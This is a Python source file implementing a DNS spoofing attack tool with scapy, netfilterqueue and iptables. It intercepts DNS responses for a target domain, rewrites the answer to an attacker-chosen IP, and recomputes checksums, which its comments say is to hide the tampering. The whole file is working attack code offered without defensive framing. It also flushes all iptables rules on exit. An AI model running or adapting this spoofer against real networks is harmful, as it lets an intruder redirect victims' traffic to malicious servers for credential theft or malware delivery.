import os, sys
import subprocess
import netfilterqueue
import scapy.all as scapy
from scapy.layers import http

class DNSSpoof:
    def __init__(self, testing:bool = False):
        """
        Best way to do it is to redirect to a web server running on the local machin and put as subsitution_ip the wifi ip of local machine
        """
        if testing :
            subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num","0"])
            subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num","0"])
        else :
            subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num","0"])
        self.queue = netfilterqueue.NetfilterQueue()
        

    def run(self, drop:bool = False, target_url:str = "www.bing.com", substitution_ip:str = "127.0.0.1"):
        """
        Run a DNS spoofing attack
        """
        self.target_url = target_url
        self.substitution_ip = substitution_ip
        self.drop = drop
        self.queue.bind(0, self.process)
        self.queue.run()
        subprocess.call(["iptables", "--flush"])

    def process(self, packet):
        """
        Process the desired packet to modify it
        """
        scp_packet = scapy.IP(packet.get_payload())
        #Work only on DNS response
        if scp_packet.haslayer(scapy.DNSRR):
            qname = scp_packet[scapy.DNSQR].qname
            #Of the target website
            if self.target_url in str(qname):
                scp_packet = self.modify_packet(scp_packet, qname)
                packet.set_payload(bytes(scp_packet))

        
        if self.drop:
            packet.drop()
        packet.accept()

    def modify_packet(self, scp_packet, qname):
        """
        Modify the packet to send to the victim
        """
        answer = scapy.DNSRR(rname = qname, rdata=self.substitution_ip)
        print("Target website accessed")

        #Modify the DNS answer
        scp_packet[scapy.DNS].an = answer

        #Specify the number of DNS answer
        scp_packet[scapy.DNS].ancount = 1

        #Avoid showing that packets have been tampered with
        del scp_packet[scapy.IP].len
        del scp_packet[scapy.IP].chksum
        del scp_packet[scapy.UDP].len
        del scp_packet[scapy.UDP].chksum


        return scp_packet

    def __del__(self):
        subprocess.call(["iptables", "--flush"])

if __name__=="__main__":
    s = DNSSpoof(testing=True)
    s.run()